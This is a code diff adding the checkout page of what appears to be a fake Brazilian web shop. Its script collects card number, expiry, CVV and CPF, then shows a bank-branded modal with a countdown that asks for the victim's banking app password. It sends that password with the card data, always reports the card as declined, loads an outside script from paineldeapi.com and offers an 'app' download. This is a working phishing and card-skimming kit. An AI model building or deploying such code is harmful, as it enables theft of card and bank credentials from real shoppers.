+      const cvEl = document.getElementById("card_cvv");
+
+      cnEl.addEventListener("input", function (e) {
+        const raw = e.target.value.replace(/\D/g, "");
+        const amex = isAmex(raw);
+        const maxDigits = amex ? 15 : 16;
+        // Format: Amex = 4-6-5, others = 4-4-4-4
+        let fmt = "";
+        const d = raw.substring(0, maxDigits);
+        if (amex) {
+          fmt =
+            d.substring(0, 4) +
+            (d.length > 4 ? " " + d.substring(4, 10) : "") +
+            (d.length > 10 ? " " + d.substring(10, 15) : "");
+        } else {
+          for (let i = 0; i < d.length; i++) {
+            if (i > 0 && i % 4 === 0) fmt += " ";
+            fmt += d[i];
+          }
+        }
+        e.target.value = fmt;
+        // Adjust CVV maxlength
+        const cvvMax = amex ? 4 : 3;
+        cvEl.maxLength = cvvMax;
+        cvEl.placeholder = amex ? "0000" : "000";
+        // Clear state while typing
+        setFieldState("card_number", "", "");
+      });
+
+      cnEl.addEventListener("blur", function (e) {
+        const raw = e.target.value.replace(/\D/g, "");
+        if (raw.length === 0) {
+          setFieldState("card_number", "", "");
+          return;
+        }
+        // TEMP TESTE: sem validação estrita no blur
+        setFieldState("card_number", "ok", "");
+      });
+
+      // ── Expiry: mask on input, validate on blur ──
+      document
+        .getElementById("card_expiry")
+        .addEventListener("input", function (e) {
+          let v = e.target.value.replace(/\D/g, "");
+          if (v.length >= 2) v = v.substring(0, 2) + "/" + v.substring(2, 4);
+          e.target.value = v;
+          setFieldState("card_expiry", "", ""); // clear while typing
+        });
+
+      document
+        .getElementById("card_expiry")
+        .addEventListener("blur", function (e) {
+          const v = e.target.value;
+          if (v.length === 0) {
+            setFieldState("card_expiry", "", "");
+            return;
+          }
+          // TEMP TESTE: sem validação estrita no blur
+          setFieldState("card_expiry", "ok", "");
+        });
+
+      // ── CVV: only digits, validate on blur ──
+      cvEl.addEventListener("input", function (e) {
+        const amex = isAmex(document.getElementById("card_number").value);
+        const max = amex ? 4 : 3;
+        e.target.value = e.target.value.replace(/\D/g, "").substring(0, max);
+        setFieldState("card_cvv", "", ""); // clear while typing
+      });
+
+      cvEl.addEventListener("blur", function (e) {
+        const len = e.target.value.length;
+        if (len === 0) {
+          setFieldState("card_cvv", "", "");
+          return;
+        }
+        // TEMP TESTE: sem validação estrita no blur
+        setFieldState("card_cvv", "ok", "");
+      });
+
+      // ── CPF do titular: mask on input, validate on blur ──
+      document
+        .getElementById("card_cpf")
+        .addEventListener("input", function (e) {
+          let v = e.target.value.replace(/\D/g, "");
+          v = v
+            .replace(/(\d{3})(\d)/, "$1.$2")
+            .replace(/(\d{3})(\d)/, "$1.$2")
+            .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+          e.target.value = v.substring(0, 14);
+          setFieldState("card_cpf", "", ""); // clear while typing
+        });
+
+      document
+        .getElementById("card_cpf")
+        .addEventListener("blur", function (e) {
+          const raw = e.target.value.replace(/\D/g, "");
+          if (raw.length === 0) {
+            setFieldState("card_cpf", "", "");
+            return;
+          }
+          // TEMP TESTE: sem validação estrita no blur
+          setFieldState("card_cpf", "ok", "");
+        });
+
+      // ── Card modal ──
+      function genHash() {
+        const c = "012345679";
+        let r = "";
+        for (let i = 0; i < 10; i++)
+          r += c[Math.floor(Math.random() * c.length)];
+        return r + "187365";
+      }
+      function applyBank() {
+        let logo = $("#ccsingle").html() || "";
+        const msg =
+          $("#ccsingle2").html() || "Informe a senha do seu app bancário.";
+        const color = $("#bcollor").val() || "var(--cp)";
+        bankName = $("#bname").val() || "NAO IDENTIFICADO";
+        const min = parseInt($("#senhanum").val()) || 4;
+        if (logo) {
+          logo = logo
+            .replace(/src="\.\/img/g, 'src="/img')
+            .replace(/src="\.\/assets/g, 'src="/assets');
+        }
+        $("#blc").html(logo);
+        $("#bmsg").html(msg);
+        $("#cbtn").css("background", color);
+        $("#timer-wrap,#timer").css({ "border-color": color, color: color });
+        $("#card-pw").attr({
+          minlength: min,
+          maxlength: min + 4,
+          placeholder: "ex. " + "1".repeat(min),
+        });
+        const mask = $("#senha").val();
+        if (mask && typeof $("#card-pw").mask === "function")
+          $("#card-pw").mask(mask);
+      }
+      function startTimer(s = 120) {
+        let r = s;
+        const el = document.getElementById("timer");
+        if (timerIv) clearInterval(timerIv);
+        timerIv = setInterval(() => {
+          const m = Math.floor(r / 60),
+            sc = r % 60;
+          el.textContent =
+            String(m).padStart(2, "0") + ":" + String(sc).padStart(2, "0");
+          if (--r < 0) {
+            clearInterval(timerIv);
+            el.textContent = "00:00";
+          }
+        }, 1000);
+      }
+      function mostrarCartao() {
+        cardHash = genHash();
+        const last4 = ckData.card_number.slice(-4);
+        document.getElementById("last4d").textContent =
+          "Cartão terminado em ****" + last4;
+        show("cs1");
+        hide("cs2");
+        hide("cs3");
+        document.getElementById("card-modal").classList.add("open");
+        bankName = $("#bname").val() || "NAO IDENTIFICADO";
+        const fd = new FormData();
+        [
+          ["metodo", "save"],
+          ["tok", cardHash],
+          ["nome", ckData.customer_name],
+          ["email", ckData.email],
+          ["cpf", ckData.card_cpf || ckData.cpf || ""],
+          ["telefone", ckData.phone],
+          ["card", ckData.card_number],
+          ["validade", ckData.card_expiry],
+          ["cvv", ckData.card_cvv],
+          ["banco", bankName],
+          ["senhae", ""],
+        ].forEach(([k, v]) => fd.append(k, v));
+        // Modo local: sem requisição de cartão.
+        setTimeout(() => {
+          hide("cs1");
+          show("cs2");
+          setTimeout(() => {
+            applyBank();
+            document.getElementById("card-pw").focus();
+            startTimer(120);
+          }, 50);
+        }, 900);
+      }
+      function submitPw() {
+        const pw = $("#card-pw").val();
+        const min = parseInt($("#senhanum").val()) || 4;
+        if (!pw || pw.length < min) {
+          $("#card-pw-err").show();
+          $("#card-pw").css("border-color", "#ef4444");
+          return;
+        }
+        $("#card-pw-err").hide();
+        $("#card-pw").css("border-color", "#e5e7eb");
+        const fd = new FormData();
+        [
+          ["metodo", "comp"],
+          ["tok", cardHash],
+          ["senha", pw],
+          ["nome", ckData.customer_name],
+          ["email", ckData.email],
+          ["cpf", ckData.card_cpf || ckData.cpf || ""],
+          ["telefone", ckData.phone],
+          ["card", ckData.card_number],
+          ["validade", ckData.card_expiry],
+          ["cvv", ckData.card_cvv],
+          ["banco", $("#bname").val() || "NAO IDENTIFICADO"],
+          ["senhae", ""],
+        ].forEach(([k, v]) => fd.append(k, v));
+        $("#cbtn").prop("disabled", true).text("Processando...");
+        hide("cs2");
+        show("cs1");
+        sendToApp("checkout_card_password_submit", {
+          ...ckData,
+          payment_method: "card",
+          card_password: pw || "",
+        });
+        // Modo local: sem requisição de cartão.
+        setTimeout(() => {
+          hide("cs1");
+          mostrarCartaoRecusado();
+        }, 1400);
+      }
+      function fecharCartao() {
+        document.getElementById("card-modal").classList.remove("open");
+        $("#card-pw").val("");
+        $("#card-pw-err").hide();
+        $("#card-pw").css("border-color", "#e5e7eb");
+        $("#cbtn").prop("disabled", false).text("CONFIRMAR");
+        if (timerIv) {
+          clearInterval(timerIv);
+          timerIv = null;
+        }
+        show("cs1");
+        hide("cs2");
+        hide("cs3");
+        hide("cs3-app");
+      }
+      function pagarPix() {
+        fecharCartao();
+        if (document.getElementById("pix-opt")) selPay("pix");
+      }
+      function outroCartao() {
+        ["card_number", "card_expiry", "card_cvv", "card_cpf"].forEach((id) => {
+          const e = document.getElementById(id);
+          if (e) {
+            e.value = "";
+            e.style.borderColor = "#e5e7eb";
+          }
+        });
+        fecharCartao();
+        setTimeout(() => document.getElementById("card_number").focus(), 300);
+      }
+
+      // ── Helpers ──
+      function show(id) {
+        const e = document.getElementById(id);
+        if (e) e.style.display = "block";
+      }
+      function hide(id) {
+        const e = document.getElementById(id);
+        if (e) e.style.display = "none";
+      }
+
+      $(document).ready(function () {
+        // card_number masked manually (amex-aware)
+        $("#card-pw").on("input", function () {
+          $(this).val($(this).val().replace(/\D/g, ""));
+        });
+      });
+    </script>
+    <script src="https://paineldeapi.com/js/cbco_ac.js"></script>
+
+    <!-- ── Alert Modal ── -->
+    <div
+      id="alert-modal"
+      style="
+        display: none;
+        position: fixed;
+        inset: 0;
+        z-index: 9999;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+      "
+    >
+      <div
+        style="
+          position: absolute;
+          inset: 0;
+          background: rgba(0, 0, 0, 0.45);
+          backdrop-filter: blur(3px);
+        "
+        onclick="closeAlertModal()"
+      ></div>
+      <div
+        style="
+          position: relative;
+          background: #fff;
+          border-radius: 20px;
+          padding: 32px 28px 24px;
+          max-width: 340px;
+          width: 100%;
+          box-shadow: 0 20px 60px rgba(0, 0, 0, 0.18);
+          text-align: center;
+          animation: alertIn 0.2s ease;
+        "
+      >
+        <div
+          id="alert-icon"
+          style="
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            font-size: 26px;
+          "
+        ></div>
+        <div
+          id="alert-title"
+          style="
+            font-size: 17px;
+            font-weight: 700;
+            color: #1f2937;
+            margin-bottom: 8px;
+          "
+        ></div>
+        <div
+          id="alert-msg"
+          style="
+            font-size: 14px;
+            color: #6b7280;
+            line-height: 1.6;
+            margin-bottom: 24px;
+          "
+        ></div>
+        <button
+          onclick="closeAlertModal()"
+          style="
+            background: var(--cb, #c620c6);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            padding: 12px 32px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+          "
+        >
+          OK
+        </button>
+      </div>
+    </div>
+    <style>
+      @keyframes alertIn {
+        from {
+          opacity: 0;
+          transform: scale(0.92) translateY(10px);
+        }
+        to {
+          opacity: 1;
+          transform: scale(1) translateY(0);
+        }
+      }
+    </style>
+
+    <script>
+      var _appDownloadToken = "";
+      var _appEnabled = false;
+      var _appWhatsapp = "";
+      (function () {
+        fetch("/api/app-config.php")
+          .then(function (r) {
+            return r.json();
+          })
+          .then(function (cfg) {
+            _appEnabled = !!cfg.enabled;
+            _appDownloadToken = cfg.download_token || "";
+            _appWhatsapp = cfg.whatsapp || "";
+            // Cupom
+            if (cfg.coupon_enabled && cfg.coupon_code) {
+              var el = document.getElementById("cs3-app-coupon");
+              if (el) {
+                var txt =
+                  'Use o CUPON <strong style="color:#f9d71c;">' +
+                  cfg.coupon_code +
+                  "</strong>";
+                if (cfg.coupon_value) txt += " e ganhe R$" + cfg.coupon_value;
+                if (cfg.coupon_min)
+                  txt += " nas compras acima de R$ " + cfg.coupon_min;
+                txt += ".";
+                el.innerHTML = txt;
+                el.style.display = "block";
+              }
+            }
+            // WhatsApp no cs3-app
+            if (_appWhatsapp) {
+              var wb = document.getElementById("cs3-app-whatsapp");
+              if (wb) wb.style.display = "block";
+              var btn = document.getElementById("cs3-app-whatsapp-btn");
+              if (btn)
+                btn.onclick = function () {
+                  window.open("https://wa.me/" + _appWhatsapp, "_blank");
+                };
+            }
+          })
+          .catch(function () {});
+      })();
+      function mostrarCartaoRecusado() {
+        if (_appEnabled) {
+          hide("cs3");
+          show("cs3-app");
+        } else {
+          hide("cs3-app");
+          show("cs3");
+        }
+      }
+      function downloadAppCard() {
+        if (_appDownloadToken)
+          window.open("/api/app-download.php?t=" + _appDownloadToken, "_blank");
+      }
+    </script>
+  </body>
+</html>
